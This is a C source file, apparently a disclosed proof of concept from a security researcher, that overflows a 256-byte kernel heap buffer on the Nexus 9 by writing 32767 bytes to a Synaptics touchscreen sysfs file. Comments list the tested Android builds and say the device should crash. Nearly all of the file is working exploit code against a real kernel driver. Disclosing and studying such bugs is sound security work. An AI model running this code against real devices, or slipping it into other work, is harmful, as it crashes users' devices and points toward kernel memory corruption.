// 2.c
//
// POC for Kernel Heap Overflow #2
//
// TESTED ON:
// [ro.build.fingerprint]:
// google/volantis/flounder:6.0.1/MOB30W/3031100:user/release-keys
// google/volantis/flounder:7.0/NRD90M/3085278:user/release-keys
// google/volantis/flounder:7.0/NRD90R/3141966:user/release-keys
//
// Sagi Kedmi (@sagikedmi), 07.09.2016, IBM Security.

#define SYSFS_SYNAPTICS_IMAGENAME "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/imagename"
#define PAYLOAD_SIZE 32767

#include <errno.h>                                                              
#include <stddef.h>                                                             
#include <stdio.h>                                                              
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>                                                             
#include <string.h>                                                             
#include <unistd.h>                                                             
#include <fcntl.h>                                                              
#include <time.h>                                                               
#include <sys/types.h>                                                          
#include <sys/stat.h>                                                           
#include <sys/time.h> 

int main (void){
    FILE *fp;
    char aaa[PAYLOAD_SIZE];
        
    if (!(fp = fopen(SYSFS_SYNAPTICS_IMAGENAME, "w"))) {
        perror("Can't open imagename virtual file.");
        return EXIT_FAILURE;
    }
 
    memset(aaa, 'a', PAYLOAD_SIZE);

    // Overrun a kernel heap buffer with length 256 bytes.
    if (fwrite(aaa, 1, sizeof(aaa), fp) != sizeof(aaa)){
        perror("Failed to write payload entirely");
        fclose(fp);
        return EXIT_FAILURE;
    }
    fclose(fp);

    // Nexus 9 should crash now.

    return EXIT_SUCCESS; 
}
